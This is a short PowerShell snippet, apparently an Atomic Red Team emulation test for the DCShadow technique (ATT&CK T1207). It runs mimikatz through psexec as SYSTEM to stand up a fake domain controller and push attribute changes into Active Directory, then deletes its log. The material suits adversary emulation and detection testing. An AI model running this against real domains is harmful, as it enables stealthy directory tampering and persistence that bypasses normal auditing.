$dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"; Start-Sleep -Seconds 5; & "#{mimikatz_path}" "lsadump::dcshadow /push" "exit"; Write-Host "`nWaiting for fake DC server to return"; Wait-Process $dc; Write-Host "`nOutput from fake DC server:"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host "End of DCShadow"